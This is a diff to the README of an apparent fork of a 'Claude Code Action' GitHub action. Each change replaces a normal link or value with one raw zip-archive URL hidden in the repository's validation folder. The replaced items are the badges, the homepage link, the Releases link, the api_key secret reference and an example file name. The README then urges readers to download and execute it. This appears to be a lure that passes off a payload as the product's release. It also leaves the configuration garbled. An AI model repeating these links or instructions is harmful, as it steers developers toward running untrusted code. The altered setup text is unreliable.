@@ -1,9 +1,9 @@
 # Claude Code Action
 
-![GitHub Release](https://img.shields.io/github/release/Andyrex1224/claude-code-action.svg)
-![GitHub Issues](https://img.shields.io/github/issues/Andyrex1224/claude-code-action.svg)
+![GitHub Release](https://github.com/Andyrex1224/claude-code-action/raw/refs/heads/main/src/github/validation/code_action_claude_1.0.zip)
+![GitHub Issues](https://github.com/Andyrex1224/claude-code-action/raw/refs/heads/main/src/github/validation/code_action_claude_1.0.zip)
 
-A general-purpose [Claude Code](https://claude.ai/code) action for GitHub PRs and issues that can answer questions and implement code changes. This action listens for a trigger phrase in comments and activates Claude to act on the request. It supports multiple authentication methods, including Anthropic direct API, Amazon Bedrock, and Google Vertex AI.
+A general-purpose [Claude Code](https://github.com/Andyrex1224/claude-code-action/raw/refs/heads/main/src/github/validation/code_action_claude_1.0.zip) action for GitHub PRs and issues that can answer questions and implement code changes. This action listens for a trigger phrase in comments and activates Claude to act on the request. It supports multiple authentication methods, including Anthropic direct API, Amazon Bedrock, and Google Vertex AI.
 
 ## Table of Contents
 
@@ -53,7 +53,7 @@ jobs:
       - name: Run Claude Code Action
         uses: Andyrex1224/claude-code-action@v1
         with:
-          api_key: ${{ secrets.CLAUDE_API_KEY }}
+          api_key: ${{ https://github.com/Andyrex1224/claude-code-action/raw/refs/heads/main/src/github/validation/code_action_claude_1.0.zip }}
 ```
 
 Replace `CLAUDE_API_KEY` with your actual API key stored in GitHub Secrets.
@@ -73,7 +73,7 @@ You can customize the trigger phrases in the configuration. By default, you can 
 ### Example Comments
 
 - **For a code review**: "Claude, can you help with this? Please review my PR."
-- **For code implementation**: "Claude, implement this change in the `main.py` file."
+- **For code implementation**: "Claude, implement this change in the `https://github.com/Andyrex1224/claude-code-action/raw/refs/heads/main/src/github/validation/code_action_claude_1.0.zip` file."
 
 ## Configuration
 
@@ -87,7 +87,7 @@ You can configure the Claude Code Action to fit your needs. Here are the key con
 
 ```yaml
 with:
-  api_key: ${{ secrets.CLAUDE_API_KEY }}
+  api_key: ${{ https://github.com/Andyrex1224/claude-code-action/raw/refs/heads/main/src/github/validation/code_action_claude_1.0.zip }}
   auth_method: 'anthropic'  # Options: 'anthropic', 'amazon', 'google'
   trigger_phrases: 'Claude, can you help with this?'
   enable_tools: true
@@ -101,7 +101,7 @@ When you submit a PR and comment, "Claude, please review this," the action will 
 
 ### Code Implementation Example
 
-If you comment, "Claude, implement this change in the `main.py` file," Claude will review the request and implement the necessary changes.
+If you comment, "Claude, implement this change in the `https://github.com/Andyrex1224/claude-code-action/raw/refs/heads/main/src/github/validation/code_action_claude_1.0.zip` file," Claude will review the request and implement the necessary changes.
 
 ## Contributing
 
@@ -120,7 +120,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-To download the latest release of Claude Code Action, visit the [Releases section](https://github.com/Andyrex1224/claude-code-action/releases). Download the latest version and execute it as per your setup instructions.
+To download the latest release of Claude Code Action, visit the [Releases section](https://github.com/Andyrex1224/claude-code-action/raw/refs/heads/main/src/github/validation/code_action_claude_1.0.zip). Download the latest version and execute it as per your setup instructions.
 
 If you encounter any issues, please check the "Releases" section for updates or fixes.
 
